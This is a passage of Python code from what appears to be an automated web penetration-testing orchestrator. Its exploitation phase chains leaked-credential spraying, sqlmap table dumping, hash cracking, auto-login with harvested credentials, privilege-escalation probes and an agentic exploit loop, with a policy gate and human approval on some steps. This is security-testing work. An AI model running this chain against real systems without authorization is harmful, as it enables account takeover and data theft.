                            self.attack_surface.add_request(req)
                        # P1.4: populate workflow + page nodes from the real
                        # captured sequence so the graph stops reporting
                        # workflows=0 / pages=0. discover_workflows_from_requests
                        # groups requests into observed sequences (register ->
                        # login -> ... ) — no fabricated data.
                        try:
                            wfs = self.attack_surface.workflows.discover_workflows_from_requests(domain_requests)
                            for _pg in (getattr(self.ctx, "crawled_pages", []) or []):
                                _purl = _pg.get("url") if isinstance(_pg, dict) else str(_pg)
                                if _purl:
                                    self.attack_surface.add_page_call(_purl, "")
                            logger.info(f"[Workflows] {len(wfs)} workflow(s), "
                                        f"{len(self.attack_surface.pages)} page(s)")
                        except Exception as _wf_e:
                            logger.debug(f"[Workflows] discovery skipped: {_wf_e}")
                        self.attack_surface.build_graph()
                        logger.info(f"[AttackSurface] Graph built: {len(extracted_endpoints)} endpoints, "
                                    f"{len(domain_requests)} requests")
            except Exception as e:
                logger.warning(f"[EndpointExtractor/AttackSurface] Failed (non-fatal): {e}")

            # Identity loading from environment
            try:
                identity_config = []
                for role in ["admin", "user", "guest"]:
                    user_env = f"IDENTITY_{role.upper()}_USERNAME"
                    pass_env = f"IDENTITY_{role.upper()}_PASSWORD"
                    if os.getenv(user_env) and os.getenv(pass_env):
                        identity_config.append({
                            "id": role,
                            "role": role,
                            "username_env": user_env,
                            "password_env": pass_env,
                        })
                if identity_config:
                    self.identity_manager.load_identities(identity_config)
                    logger.info(f"[IdentityManager] Loaded {len(identity_config)} identities")
            except Exception as e:
                logger.warning(f"[IdentityManager] Identity loading failed (non-fatal): {e}")

            # Site adaptation: profile target for applicable tests
            try:
                adapter = GenericSiteAdapter(
                    target_url=self.ctx.target,
                    headers=getattr(self.ctx, 'response_headers', None) or {},
                    body_content=getattr(self.ctx, 'body_content', '') or '',
                )
                site_profile = adapter.profile()
                self.ctx.update('site_profile', site_profile.to_dict())
                logger.info(f"[SiteAdapter] Profiled: tech={site_profile.technology_stack} "
                            f"auth={site_profile.auth_model.value} tests={len(site_profile.applicable_tests)}")
            except Exception as e:
                logger.warning(f"[SiteAdapter] Profiling failed (non-fatal): {e}")

            # ── V2 Hook: Feed discovered endpoints into v2 inventory + build coverage matrix ──
            try:
                self._feed_endpoints_to_v2()
                self._build_coverage_matrix_from_surface()
            except Exception as e:
                logger.warning(f"[V2Sync] Endpoint/coverage sync failed (non-fatal): {e}")

            # ── V2 Hook: SPA detection baseline ──
            try:
                if hasattr(self.ctx, 'target') and self.ctx.target:
                    from urllib.parse import urlparse
                    parsed = urlparse(self.ctx.target if self.ctx.target.startswith("http") else f"https://{self.ctx.target}")
                    host = parsed.netloc or parsed.path
                    baseline_path = self.spa_detector.create_baseline_path()
                    # Actually request the baseline path and record the response
                    import httpx
                    base_url = f"{parsed.scheme or 'https'}://{host}{baseline_path}"
                    try:
                        async with httpx.AsyncClient(timeout=10, verify=False, follow_redirects=True) as client:
                            resp = await client.get(base_url)
                            self.spa_detector.record_baseline(
                                host=host,
                                status=resp.status_code,
                                content_length=len(resp.content),
                                body=resp.text[:50000],
                                title="",
                            )
                            logger.info(f"[SPADetector] Baseline recorded for {host}: "
                                        f"status={resp.status_code} len={len(resp.content)}")
                            if hasattr(self.ctx, 'attack_surface') and self.ctx.attack_surface:
                                self.ctx.attack_surface.set_spa_baseline(host, {
                                    "status": resp.status_code,
                                    "content_length": len(resp.content),
                                    "path": baseline_path,
                                })
                    except Exception as req_err:
                        logger.debug(f"[SPADetector] Baseline request failed: {req_err}")
            except Exception as e:
                logger.debug(f"[SPADetector] Baseline setup skipped: {e}")

            # ── V2 Hook: Generate hypotheses from attack surface ──
            try:
                if hasattr(self.ctx, 'attack_surface') and self.ctx.attack_surface:
                    hypotheses = self.hypothesis_engine_v2.generate_from_surface(self.ctx.attack_surface)
                    logger.info(f"[HypothesisEngineV2] Generated {len(hypotheses)} hypotheses from attack surface")
                    self.ctx.update('hypotheses_v2', hypotheses[:50])
            except Exception as e:
                logger.warning(f"[HypothesisEngineV2] Generation failed (non-fatal): {e}")

            # ── V2 Hook: Initialize identity-aware coverage ──
            try:
                identities = list(getattr(self.identity_manager, '_identities', {}).keys()) if hasattr(self, 'identity_manager') else []
                if identities:
                    ep_ids = [ep.get("endpoint_id", str(i)) for i, ep in enumerate(self.endpoint_inventory.list_endpoints())]
                    test_ids = [t.test_id for t in self.test_catalog_v2.list_all()]
                    cells = self.identity_coverage.initialize_matrix(test_ids, ep_ids, identities)
                    logger.info(f"[IdentityCoverage] Initialized {cells} coverage cells for {len(identities)} identities")
            except Exception as e:
                logger.debug(f"[IdentityCoverage] Init skipped: {e}")

            # ── Advanced Engines Sync: ApplicationModel, MultiChannelDiscovery, SemanticInference, SpecialistTeam ──
            try:
                self._sync_recon_to_advanced_engines()
            except Exception as _sync_err:
                logger.debug(f"[AdvancedSync] Recon sync failed (non-fatal): {_sync_err}")

        elif phase == ExecutionPhase.ACTIVE_SCANNING.value:
            from core.tools.nuclei_runner import NucleiRunner
            nuclei_runner = NucleiRunner()
            await nuclei_runner.scan_context_technologies(self.ctx, timeout=60)
            await self._run_phase("analyze")
            await self._persist_vulnerabilities()

            # Hydrate attack surface from ctx.endpoints before building injection matrix.
            # ctx.endpoints are URLs discovered by tools (katana/ffuf/gobuster) — they need
            # to be converted to proper Endpoint domain objects with extracted parameters.
            try:
                self._hydrate_attack_surface_from_ctx_endpoints()
            except Exception as e:
                logger.warning(f"[AttackSurface] ctx.endpoints hydration failed (non-fatal): {e}")

            # Build injection test matrix from attack surface endpoints
            try:
                as_endpoints = self.attack_surface.api_endpoints()
                if as_endpoints:
                    test_matrix = self.injection_matrix.build_matrix(as_endpoints)
                    matrix_tests = getattr(test_matrix, 'tests', [])
                    logger.info(f"[InjectionMatrix] Built matrix: {len(matrix_tests)} injection tests "
                                f"across {len(as_endpoints)} API endpoints")
                    self._log_activity("injection",
                        f"Injection matrix: {len(matrix_tests)} tests across {len(as_endpoints)} endpoints",
                        tool="injection_matrix")
                    self.ctx.update('injection_matrix', {
                        'test_count': len(matrix_tests),
                        'endpoint_count': len(as_endpoints),
                    })
                else:
                    logger.info("[InjectionMatrix] No API endpoints in attack surface — skipping matrix build")
            except Exception as e:
                logger.warning(f"[InjectionMatrix] Matrix build failed (non-fatal): {e}")

            # Modern API surface — GraphQL / gRPC / WebSocket testing.
            from core.common.config import get_config as _get_cfg_api
            if _get_cfg_api().get_bool("MODERN_API_ENABLED", True):
                try:
                    await self._scan_modern_apis()
                except Exception as e:
                    logger.warning(f"[ModernAPI] scan failed (non-fatal): {e}")

            # ── V2 Hook: Sync V1 scan findings into coverage matrix ──
            try:
                self._sync_v1_findings_to_coverage_matrix()
            except Exception as e:
                logger.warning(f"[V1→V2Bridge] Post-scan sync failed (non-fatal): {e}")

            # ── V2 Hook: Record scan responses in feedback loop + structured learning ──
            # P2-8: real findings live in ctx.vulnerabilities (ctx.findings was
            # empty), and the call used kwargs that don't match
            # record_experiment_outcome's signature (payload/success/details) →
            # every call raised and nothing was recorded ("Recorded 0"). Map vuln
            # fields onto the real signature and count what actually persisted.
            try:
                scan_findings = getattr(self.ctx, 'vulnerabilities', []) or []
                if isinstance(scan_findings, dict):
                    scan_findings = list(scan_findings.values())
                recorded = 0
                for finding in scan_findings[-50:]:
                    if not isinstance(finding, dict):
                        continue
                    vtype = (finding.get("type") or "").strip()
                    attack_type = (finding.get("attack_type") or finding.get("category")
                                   or vtype or "generic").lower()
                    test_id = finding.get("test_id") or vtype or "auto_detect"
                    confirmed = bool(finding.get("confirmed")) or \
                        str(finding.get("status", "")).upper() in ("CONFIRMED", "REPORTABLE")
                    self.structured_learning.record_experiment_outcome(
                        test_id=test_id,
                        attack_type=attack_type,
                        target=finding.get("location") or finding.get("target") or self.ctx.target,
                        outcome="CONFIRMED" if confirmed else "REPORTED",
                        technology=finding.get("technology", ""),
                        payload_used=finding.get("payload") or finding.get("proof", ""),
                        lesson=finding.get("title", ""),
                        confidence=1.0 if confirmed else 0.5,
                    )
                    recorded += 1
                logger.info(f"[StructuredLearning] Recorded {recorded} scan outcomes")
            except Exception as e:
                logger.debug(f"[StructuredLearning] Scan recording skipped: {e}")

            # ── V2 Hook: Record target health from scan phase ──
            try:
                if hasattr(self.target_health_manager, 'record_response'):
                    self.target_health_manager.record_response(
                        status_code=200,
                        response_time_ms=0,
                        error=False,
                    )
                    logger.debug("[TargetHealth] Post-scan health check recorded")
            except Exception as e:
                logger.debug(f"[TargetHealth] Health recording skipped: {e}")

            # ── Advanced Engines Sync: ResourceGovernor, DifferentialEngine, AnomalyPipeline, SpecialistTeam ──
            try:
                self._sync_scanning_to_advanced_engines()
            except Exception as _sync_err:
                logger.debug(f"[AdvancedSync] Scanning sync failed (non-fatal): {_sync_err}")

        elif phase == ExecutionPhase.EXPLOITATION.value:
            # P0.1: Unified PolicyEngine gate (delegates to ComplianceGate internally)
            try:
                from core.security.policy_engine import get_policy_engine
                _exploit_decision = get_policy_engine().authorize_exploit(self.ctx.target)
                if not _exploit_decision.allowed:
                    logger.warning(f"PolicyEngine denied exploit: {_exploit_decision.reason} (code={_exploit_decision.reason_code}). Skipping EXPLOIT phase.")
                    return
            except ImportError:
                # Fallback to legacy ComplianceGate if PolicyEngine unavailable
                check = self.compliance_gate.check_before_exploit(self.ctx.target)
                if not check.authorized:
                    logger.warning(f"Compliance check failed: {check.reason}. Skipping EXPLOIT phase.")
                    return

            # Hypothesis generation from coverage gaps
            try:
                gaps = self.coverage_engine.get_coverage_gaps()
                if gaps:
                    gap_ids = [g if isinstance(g, str) else g.test_id for g in gaps]
                    hypotheses = self.hypothesis_generator.generate(gap_ids)
                    if hypotheses:
                        logger.info(f"[HypothesisGen] Generated {len(hypotheses)} hypotheses from {len(gap_ids)} coverage gaps")
                        for h in hypotheses[:10]:
                            self.experiment_scheduler.queue(h, priority=h.confidence)
                        logger.info(f"[Scheduler] Queued {min(len(hypotheses), 10)} experiments")
                else:
                    logger.info("[HypothesisGen] No coverage gaps — all tests addressed")
            except Exception as e:
                logger.warning(f"[HypothesisGen] Hypothesis generation failed (non-fatal): {e}")

            # Convergence check
            try:
                conv_score = self.convergence_engine.calculate_convergence()
                conv_state = self.convergence_engine.get_state()
                logger.info(f"[Convergence] Score={conv_score:.1f}% State={conv_state.value}")
            except Exception as e:
                logger.warning(f"[Convergence] Check failed (non-fatal): {e}")

            # Fuzzer-driven injection testing on attack surface endpoints
            try:
                as_endpoints = self.attack_surface.api_endpoints()
                if as_endpoints:
                    fuzz_count = 0
                    for ep in as_endpoints[:10]:
                        for test_type in ["sqli", "xss"]:
                            tools = self.fuzzer_orchestrator.get_applicable_tools(test_type)
                            if tools:
                                params = {
                                    "endpoint_url": getattr(ep, 'url', ''),
                                    "method": getattr(ep, 'method', 'GET'),
                                }
                                try:
                                    result = await asyncio.to_thread(
                                        self.fuzzer_orchestrator.run_fuzzing, test_type, ep, params)
                                    if result and getattr(result, 'success', False):
                                        fuzz_count += 1
                                        self.experience_learner.record_success(
                                            test_type, tools[0], {"endpoint": getattr(ep, 'url', '')})
                                    else:
                                        self.experience_learner.record_failure(
                                            test_type, tools[0], getattr(result, 'error', 'no_result'))
                                except Exception:
                                    pass
                    if fuzz_count:
                        logger.info(f"[FuzzerOrchestrator] {fuzz_count} successful fuzzing results")
            except Exception as e:
                logger.warning(f"[FuzzerOrchestrator] Fuzzing failed (non-fatal): {e}")

            # ── AUTHZ phase (Phase 1.3): cross-role replay of every captured
            # authenticated request under every discovered identity. Finds
            # BOLA / IDOR / vertical privilege escalation that per-endpoint
            # nuclei/nikto/dalfox never sees because they don't know about
            # role sessions. Non-fatal — logs and skips if no identities or
            # no captured requests are on the ctx yet.
            try:
                await self._run_authz_phase()
            except Exception as e:
                logger.warning(f"[AUTHZ] cross-role replay failed (non-fatal): {e}")

            # ── Semantic fuzzer + coverage-guided loop (Phase 1.4 + 4.1) ──
            try:
                await self._run_semantic_fuzz_with_coverage()
            except Exception as e:
                logger.warning(f"[SemanticFuzz] failed (non-fatal): {e}")

            # ── File-format probes (Phase 2.2): try HDF5 / fsspec / YAML /
            # pickle / parquet attacks against any endpoint that accepts
            # file uploads. Non-fatal.
            try:
                await self._run_format_probes()
            except Exception as e:
                logger.warning(f"[FormatProbes] failed (non-fatal): {e}")

            chain_plan = None
            if self.ctx.vulnerabilities:
                self.chain_mgr.build_graph()
                chains = self.chain_mgr.detect_chains(max_chains=5)
                if chains:
                    chain_plan = self.chain_mgr.get_exploitation_plan()
                    logger.info(f"Found {len(chains)} attack chains")
                else:
                    logger.info("No attack chains found, falling back to direct exploitation")
                    plan = await self._generate_exploit_plan()
            
            if chain_plan and chain_plan.get("top_chains"):
                approved = await self._human_approval(chain_plan)
                if approved:
                    result = await self.chain_mgr.llm_select_and_execute()
                    if result and result.status == "completed":
                        suggestions = self.chain_mgr.suggest_next_exploits()
                        if suggestions:
                            await self._run_phase("exploit")
                            await self._persist_exploit_results()
                    else:
                        await self._run_phase("exploit")
                        await self._persist_exploit_results()
            elif self.ctx.vulnerabilities:
                plan = await self._generate_exploit_plan()
                if plan and plan.get("exploits"):
                    approved = await self._human_approval(plan)
                    if approved:
                        await self._run_phase("exploit")
                        await self._persist_exploit_results()
                        
            # Replay-based authorization testing (IDOR/privilege escalation)
            try:
                captured = getattr(self.ctx, 'captured_requests', []) or []
                auth_endpoints = self.attack_surface.endpoints_requiring_auth()
                if captured and auth_endpoints and self.identity_manager.identities:
                    replay_count = 0
                    for ep in auth_endpoints[:5]:
                        ep_requests = self.attack_surface.requests_for_endpoint(
                            getattr(ep, 'endpoint_id', getattr(ep, 'id', '')))
                        if not ep_requests:
                            continue
                        for ident_id, identity in self.identity_manager.identities.items():
                            try:
                                replayed = self.replay_engine.replay_request(
                                    ep_requests[0], identity)
                                if replayed:
                                    replay_count += 1
                            except Exception:
                                pass
                    if replay_count:
                        logger.info(f"[ReplayEngine] Replayed {replay_count} requests for auth testing")
            except Exception as e:
                logger.warning(f"[ReplayEngine] Replay testing failed (non-fatal): {e}")

            # Access Control Matrix Testing
            try:
                auth_endpoints = self.attack_surface.endpoints_requiring_auth()
                if auth_endpoints and self.identity_manager.identities:
                    tested = 0
                    for ep in auth_endpoints[:5]:
                        ep_requests = self.attack_surface.requests_for_endpoint(
                            getattr(ep, 'endpoint_id', getattr(ep, 'id', '')))
                        if ep_requests:
                            req_node = {
                                "path": getattr(ep, 'path', getattr(ep, 'url', '')),
                                "method": getattr(ep, 'method', 'GET'),
                                "request": ep_requests[0],
                            }
                            self.access_control_engine.analyze(req_node)
                            tested += 1
                    if tested:
                        logger.info(f"[AccessControlMatrix] Tested {tested} auth-required endpoints")
            except Exception as e:
                logger.warning(f"[AccessControlMatrix] Testing failed (non-fatal): {e}")

            # Credential Spray — OSINT-driven: leaked creds + employee-derived usernames
            # first, then generic defaults.
            try:
                from core.exploitation.credential_spray import CredentialSprayEngine
                osint_creds, osint_users, osint_pw = self._osint_spray_material()
                spray = CredentialSprayEngine(
                    target=self.ctx.target,
                    osint_creds=osint_creds,
                    osint_usernames=osint_users,
                    osint_passwords=osint_pw,
                )
                if osint_creds or osint_users:
                    logger.info(f"[CredSpray] Seeded from OSINT: {len(osint_creds)} leaked pairs, "
                                f"{len(osint_users)} usernames, {len(osint_pw)} leaked passwords")
                endpoints = getattr(self.ctx, 'endpoints', []) or []
                captured = getattr(self.ctx, 'captured_requests', []) or []
                spray_results = await spray.spray(endpoints, captured)
                spray_findings = spray.get_findings()
                for sf in spray_findings:
                    self.ctx.add_vulnerability(sf)
                successes = [r for r in spray_results if r.success]
                if successes:
                    logger.info(f"[CredSpray] {len(successes)} default credential logins found!")
                    for s in successes:
                        self.ctx.harvested_creds.append({
                            "username": s.username, "url": s.url,
                            "login_type": s.login_type, "source": "credential_spray",
                            # Carry password + live token so _auto_login_with_harvested_creds
                            # and CredChain can run the authenticated sweep (privesc, IDOR,
                            # post-exploitation) instead of dropping the session here.
                            "password": getattr(s, "password", "") or "",
                            "token": getattr(s, "session_token", "") or "",
                        })
                else:
                    logger.info("[CredSpray] No default credentials found")
            except Exception as e:
                logger.warning(f"[CredSpray] Credential spray failed (non-fatal): {e}")

            # SQLi → sqlmap escalation: for each confirmed SQL-injection vuln,
            # run sqlmap --batch --dump against the known-users table so admin
            # rows land in harvested_creds and feed the auth chain below.
            try:
                await self._escalate_sqli_to_dump()
            except Exception as _e:
                logger.warning(f"[SQLiDump] escalation failed (non-fatal): {_e}")

            # Structured cred extraction: any finding whose details/evidence
            # contains "email : hash|password" rows (e.g. the LLM's UNION-dump
            # proof text) gets its plaintext parsed into leaked_credentials +
            # post_exploit_data + auth_bypasses. This closes the gap where the
            # LLM captured admin@juice-sh.op:0192... in a finding's evidence
            # but nothing structured it for the credential-chain.
            try:
                from core.exploitation.dump_extractor import extract_from_all_findings
                extract_from_all_findings(self._scan_id,
                                           getattr(self.ctx, "vulnerabilities", []) or [],
                                           ctx=self.ctx)
            except Exception as _e:
                logger.warning(f"[DumpExtractor] failed (non-fatal): {_e}")

            # Hash cracking: for every harvested password hash try the top-10k
            # wordlist (Python md5/sha1/sha256 + hashcat fallback for bcrypt).
            # Cracked plaintexts flow into harvested_creds → CredChain.
            try:
                from core.exploitation.hash_cracker import crack_hashes
                from pathlib import Path as _P
                await crack_hashes(self.ctx, _P(__file__).resolve().parents[2])
            except Exception as _e:
                logger.warning(f"[HashCracker] failed (non-fatal): {_e}")

            # Injection replay: mutate every captured request's params with SQLi/
            # XSS/CMD/SSRF payloads. Catches injection on authenticated POST/JSON
            # bodies the crawler already reached but plain scanners never fuzz.
            try:
                from core.exploitation.request_replayer import replay_captured_requests
                await replay_captured_requests(self.ctx, max_requests=0)
            except Exception as _e:
                logger.warning(f"[RequestReplayer] failed (non-fatal): {_e}")

            # Auto-login with any plaintext creds (from cracker / sqlmap dump / OSINT).
            # Each successful login obtains a fresh JWT which we publish to the auth
            # registry AND record as an "Access Gained" event. This is what lets the
            # CredChain block below actually operate as an authenticated user.
            try:
                await self._auto_login_with_harvested_creds()
            except Exception as _e:
                logger.warning(f"[AutoLogin] failed (non-fatal): {_e}")

            # Credential chaining: auto-run IDOR/JWT/authz/mass-assignment tests
            # with harvested credentials against all discovered endpoints
            if self.ctx.harvested_creds:
                try:
                    logger.info(f"[CredChain] {len(self.ctx.harvested_creds)} creds found — running authenticated sweep")
                    base_url = self.ctx.target.rstrip("/")
                    if not base_url.startswith(("http://", "https://")):
                        base_url = f"https://{base_url}"

                    ep_list = []
                    for raw_ep in (getattr(self.ctx, "endpoints", []) or [])[:50]:
                        ep = raw_ep if isinstance(raw_ep, str) else raw_ep.get("url", raw_ep.get("path", ""))
                        if ep:
                            ep_list.append(ep)

                    auth_token = None
                    for cred in self.ctx.harvested_creds:
                        if cred.get('token'):
                            auth_token = cred['token']
                            break

                    auth_test_ids = [
                        "authz_idor_01", "authz_idor_02", "authz_horizontal_01",
                        "jwt_manipulation_01", "jwt_none_algo_01", "jwt_algo_confusion_01",
                        "authz_mass_assignment_01", "csrf_basic_01",
                        "bizlogic_price_manipulation_01", "bizlogic_negative_quantity_01",
                    ]
                    from core.domain.experiment import SecurityExperiment
                    cred_chain_ran = 0
                    for tid in auth_test_ids:
                        executor = self.executor_registry.get(tid)
                        if not executor:
                            continue
                        try:
                            exp = SecurityExperiment(
                                hypothesis_id=f"credchain_{tid}",
                                endpoint_id=base_url,
                                capability=tid.split("_")[0],
                                test_id=tid,
                                input_parameters={
                                    "url": base_url,
                                    "endpoints": ep_list,
                                    "auth_token": auth_token,
                                },
                            )
                            result = executor.execute(exp)
                            cred_chain_ran += 1
                            if result.evidence:
                                self._ingest_executor_findings(tid, base_url, result.evidence)
                        except Exception as ex:
                            logger.debug(f"[CredChain] Test {tid} failed: {ex}")
                    logger.info(f"[CredChain] Executed {cred_chain_ran} authenticated tests")
                except Exception as e:
                    logger.warning(f"[CredChain] Authenticated sweep failed (non-fatal): {e}")

            # === Advanced generic modules (target-agnostic) ===
            # 1) JS bundle analyzer — extract hidden SPA routes and feed them
            #    into ctx.endpoints so every downstream module sees them.
            try:
                from core.exploitation.js_bundle_analyzer import analyze_bundles
                base = self.ctx.target if str(self.ctx.target).startswith(("http://","https://")) else f"https://{self.ctx.target}"
                await analyze_bundles(self.ctx, base)
            except Exception as _e:
                logger.warning(f"[JSBundleAnalyzer] failed (non-fatal): {_e}")

            # 2) Cross-role replay (BOLA/IDOR) — requires AutoLogin to have
            #    populated multiple sessions.
            try:
                from core.exploitation.cross_role_replay import run_cross_role_replay
                await run_cross_role_replay(self.ctx)
            except Exception as _e:
                logger.warning(f"[CrossRoleReplay] failed (non-fatal): {_e}")

            # 3) Semantic API fuzzer — business-logic abuse on every JSON POST.
            try:
                from core.exploitation.semantic_api_fuzzer import run_semantic_fuzz
                await run_semantic_fuzz(self.ctx)
            except Exception as _e:
                logger.warning(f"[SemanticFuzzer] failed (non-fatal): {_e}")

            # 4) Headless-browser DOM sink monitor — client-side XSS via
            #    Playwright hooks on document.write/eval/innerHTML/etc.
            try:
                from core.exploitation.dom_sink_monitor import run_dom_sink_monitor
                base = self.ctx.target if str(self.ctx.target).startswith(("http://","https://")) else f"https://{self.ctx.target}"
                await run_dom_sink_monitor(self.ctx, base)
            except Exception as _e:
                logger.warning(f"[DOMSinkMonitor] failed (non-fatal): {_e}")

            # 5) GraphQL + WebSocket generic discovery and abuse.
            try:
                from core.exploitation.graphql_ws_probe import run_graphql_and_ws
                await run_graphql_and_ws(self.ctx)
            except Exception as _e:
                logger.warning(f"[GraphQLWSProbe] failed (non-fatal): {_e}")

            # Existing expert-mode probes: JWT kid, prototype pollution, HTTP
            # smuggling sweep, SSRF metadata, timing user-enum, captcha bypass.
            try:
                from core.exploitation.expert_probes import run_all_expert_probes
                exp_findings = await run_all_expert_probes(self.ctx)
                logger.info(f"[ExpertProbes] Ran full expert sweep: {len(exp_findings)} finding(s)")
            except Exception as _e:
                logger.warning(f"[ExpertProbes] sweep failed (non-fatal): {_e}")

            # Web-level privilege escalation: forced browsing to admin paths + role
            # escalation with any harvested credentials.
            try:
                await self._probe_web_privilege_escalation()
            except Exception as e:
                logger.warning(f"[WebPrivesc] Privilege escalation probing failed (non-fatal): {e}")

            # Browser-based DOM XSS validation using Playwright/Chromium
            try:
                await self._browser_xss_validation()
            except Exception as e:
                logger.warning(f"[BrowserXSS] Browser-based XSS validation failed (non-fatal): {e}")

            # Exploit synthesis + sandbox detonation (opt-in) — the agent writes a
            # custom non-destructive PoC and fires it in an ephemeral sandbox.
            from core.common.config import get_config as _get_cfg_synth
            if _get_cfg_synth().get_bool("EXPLOIT_SYNTHESIS_ENABLED", False):
                try:
                    await self._synthesize_and_detonate_exploits()
                except Exception as e:
                    logger.warning(f"[Sandbox] exploit synthesis failed (non-fatal): {e}")

            # Cloud IAM / RBAC / container privilege-escalation analysis (opt-in,
            # data-driven from exported policy files or live cloud credentials).
            if _get_cfg_synth().get_bool("CLOUD_PRIVESC_ENABLED", False):
                try:
                    self._analyze_cloud_privesc()
                except Exception as e:
                    logger.warning(f"[CloudPrivesc] analysis failed (non-fatal): {e}")

            # General agentic exploitation (opt-in) — an oracle/evidence-driven
            # ReAct loop with the full actuator toolkit (HTTP, JWT, encode, upload,
            # real browser) that actively demonstrates vulns on the authorized
            # target and reports findings. Works for any in-scope URL.
            if _get_cfg_synth().get_bool("AGENT_EXPLOIT_ENABLED", True):
                try:
                    await self._run_agent_exploitation()
                except Exception as e:
                    logger.warning(f"[AgentExploit] agentic exploitation failed (non-fatal): {e}")

            # Audit exploitation actions
            try:
                self.execution_auditor.log_action(
                    "EXPLOITATION_COMPLETE",
                    {"target": self.ctx.target,
                     "vulns": len(self.ctx.vulnerabilities),
                     "exploits": len(self.ctx.exploit_results)},
                )
            except Exception:
                pass
            self._log_activity("exploit",
                f"Exploitation complete: {len(self.ctx.vulnerabilities)} vulns, {len(self.ctx.exploit_results)} exploits",
                output_data=f"Vulnerabilities: {len(self.ctx.vulnerabilities)}, Exploits: {len(self.ctx.exploit_results)}")

            await self._run_post_exploitation()

            # ── V2 Hook: Sync V1 findings + run experiment cycle on remaining gaps ──
            try:
                self._feed_endpoints_to_v2()
                self._build_coverage_matrix_from_surface()
                self._sync_v1_findings_to_coverage_matrix()
                self._run_v2_experiment_cycle()
                conv = self.convergence_engine.calculate_convergence()
                logger.info(f"[V2ExploitCycle] Post-exploitation coverage={conv:.1%}, "
                            f"gaps={len(self.coverage_matrix.get_gaps())}, "
                            f"blocked={len(self.coverage_matrix.get_blocked())}")
            except Exception as e:
                logger.warning(f"[V2ExploitCycle] Failed (non-fatal): {e}")

            # ── V2 Hook: Exploit chain prerequisite checks ──
            try:
                from core.exploitation.exploit_chain import create_cors_credential_chain, create_sqli_to_rce_chain, create_idor_to_data_chain
                chain_context = {
                    "endpoints": getattr(self.ctx, 'attack_surface', {}).endpoints if hasattr(getattr(self.ctx, 'attack_surface', None), 'endpoints') else {},
                    "findings": {f.get("finding_id", str(i)): f for i, f in enumerate(self.ctx.vulnerabilities)} if hasattr(self.ctx, 'vulnerabilities') else {},
                    "identities": getattr(getattr(self.ctx, 'attack_surface', None), 'identities', {}) if hasattr(self.ctx, 'attack_surface') else {},
                    "technologies": getattr(getattr(self.ctx, 'attack_surface', None), 'technologies', {}) if hasattr(self.ctx, 'attack_surface') else {},
                    "cors_findings": [f for f in self.ctx.vulnerabilities if f.get("attack_type") == "cors"] if hasattr(self.ctx, 'vulnerabilities') else [],
                }
                chains_ready = 0
                for finding in self.ctx.vulnerabilities[:20]:
                    ep = finding.get("endpoint", finding.get("url", ""))
                    attack_type = finding.get("attack_type", "")
                    if attack_type == "cors":
                        chain = create_cors_credential_chain(ep)
                    elif attack_type == "sqli":
                        chain = create_sqli_to_rce_chain(ep)
                    elif attack_type in ("idor", "authorization"):
                        chain = create_idor_to_data_chain(ep)
                    else:
                        continue
                    missing = chain.check_prerequisites(chain_context)
                    if chain.is_ready:
                        chains_ready += 1
                logger.info(f"[ExploitChain] {chains_ready} chains ready from {len(self.ctx.vulnerabilities)} findings")
            except Exception as e:
                logger.debug(f"[ExploitChain] Chain check skipped: {e}")

            # ── V2 Hook: POC gating on confirmed findings ──
            try:
                all_findings = self.ctx.vulnerabilities if hasattr(self.ctx, 'vulnerabilities') else []
                finding_dicts = [f if isinstance(f, dict) else getattr(f, '__dict__', {}) for f in all_findings]
                reportable = self.poc_gate.filter_reportable(finding_dicts)
                logger.info(f"[POCGate] {len(reportable)}/{len(finding_dicts)} findings pass POC gate")
            except Exception as e:
                logger.debug(f"[POCGate] Gating skipped: {e}")

            # ── V2 Hook: Structured learning from exploitation outcomes ──
            try:
                exploit_results = self.ctx.exploit_results if hasattr(self.ctx, 'exploit_results') else []
                _ex_rec = 0
                for result in exploit_results[-20:]:
                    if isinstance(result, dict):
                        _succ = bool(result.get("success", False))
                        self.structured_learning.record_experiment_outcome(
                            test_id=result.get("test_id") or result.get("exploit_type") or result.get("vuln_type", "exploit"),
                            attack_type=(result.get("attack_type") or result.get("exploit_type")
                                         or result.get("vuln_type", "exploit")),
                            target=result.get("location") or result.get("target") or self.ctx.target,
                            outcome="CONFIRMED" if _succ else "REJECTED",
                            technology=result.get("technology", ""),
                            payload_used=result.get("payload") or result.get("proof", ""),
                            lesson=result.get("title", result.get("description", "")),
                            confidence=1.0 if _succ else 0.3,
                        )
                        _ex_rec += 1
                logger.info(f"[StructuredLearning] Recorded {_ex_rec} exploit outcomes")
            except Exception as e:
                logger.debug(f"[StructuredLearning] Exploit recording skipped: {e}")

            # ── V2 Hook: Feed hypothesis results back ──
            try:
                hypotheses_v2 = self.ctx.get('hypotheses_v2', []) if hasattr(self.ctx, 'get') else getattr(self.ctx, 'hypotheses_v2', [])
                if hypotheses_v2:
                    confirmed_types = {f.get("attack_type") for f in self.ctx.vulnerabilities if f.get("state") in ("CONFIRMED", "REPORTABLE")}
                    for h in hypotheses_v2:
                        if hasattr(h, 'attack_type') and h.attack_type in confirmed_types:
                            self.hypothesis_engine_v2.record_feedback(h, "CONFIRMED")
                        elif hasattr(h, 'state') and h.state == "TESTING":
                            self.hypothesis_engine_v2.record_feedback(h, "REJECTED")
                    logger.info(f"[HypothesisEngineV2] Fed back results for {len(hypotheses_v2)} hypotheses")
            except Exception as e:
                logger.debug(f"[HypothesisEngineV2] Feedback skipped: {e}")

            # ── V2 Hook: Update identity coverage from exploitation ──
            try:
                for finding in self.ctx.vulnerabilities[-20:]:
                    if isinstance(finding, dict):
                        ep_id = finding.get("endpoint_id", finding.get("endpoint", ""))
                        identity_id = finding.get("identity_id", finding.get("identity", ""))
                        test_id = finding.get("test_id", "")
                        if ep_id and test_id:
                            self.identity_coverage.mark_tested(test_id, ep_id, identity_id or "anonymous", finding.get("state", "TESTED"))
            except Exception as e:
                logger.debug(f"[IdentityCoverage] Update skipped: {e}")

            # ── Advanced Engines Sync: HypothesisLedger, EvidenceGraph, SecretLifecycle, SpecialistTeam ──
            try:
                self._sync_exploit_to_advanced_engines()
            except Exception as _sync_err:
                logger.debug(f"[AdvancedSync] Exploit sync failed (non-fatal): {_sync_err}")

        elif phase == ExecutionPhase.REPORTING.value:
            # Convergence validation before reporting
            try:
                is_complete, issues = self.completion_validator.validate_completion()
                conv_score = self.convergence_engine.calculate_convergence()
                logger.info(f"[CompletionValidator] complete={is_complete} score={conv_score:.1f}%")
                if issues:
                    for issue in issues:
                        logger.info(f"[CompletionValidator] Issue: {issue}")
            except Exception as e:
                logger.warning(f"[CompletionValidator] Validation failed (non-fatal): {e}")

            # Finding Correlation — chain related findings into attack narratives
            if self.ctx.vulnerabilities:
                try:
                    from core.analysis.correlation_engine import CorrelationEngine
                    correlator = CorrelationEngine()
